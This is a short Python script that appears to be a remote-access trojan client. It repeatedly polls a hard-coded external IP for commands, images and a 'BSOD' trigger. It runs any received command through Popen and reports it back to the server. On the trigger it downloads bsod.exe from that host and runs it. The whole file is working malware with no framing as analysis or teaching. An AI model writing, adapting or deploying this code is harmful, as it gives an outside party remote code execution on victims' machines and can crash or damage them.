from PIL import UnidentifiedImageError, Image
from requests import Response, post, get
from subprocess import Popen
from time import sleep
from os import remove

DELAY = 5
IP = "143.42.110.206"
PORT = 80
SCHEME = "http"


def invoke_bsod() -> None:
    with open("temp.exe", "wb") as temp_file:
        temp_file.write(get(f"{SCHEME}://{IP}:{PORT}/bsod.exe").content)
    Popen("temp.exe")
    remove("temp.exe")


def main() -> None:
    while True:
        get_commands_response = get(f"{SCHEME}://{IP}:{PORT}/command-center")
        get_images_response = get(f"{SCHEME}://{IP}:{PORT}/image-center")
        get_bsod_response = get(f"{SCHEME}://{IP}:{PORT}/bsod-center")
        if get_commands_response.status_code == 200:
            run_command(get_commands_response)
        if get_images_response.status_code == 200:
            load_image(get_images_response)
        if get_bsod_response.status_code == 200:
            invoke_bsod()
        sleep(DELAY)


def load_image(get_images_response: Response):
    with open("temp", "wb") as temp_image_file:
        temp_image_file.write(get_images_response.content)
    try:
        Image.open("temp").show()
    except UnidentifiedImageError:
        pass
    remove("temp")


def run_command(get_commands_response: Response):
    Popen(get_commands_response.text)
    post(
        f"{SCHEME}://{IP}:{PORT}/command-center",
        data={"command": get_commands_response.text},
    )


if __name__ == "__main__":
    main()
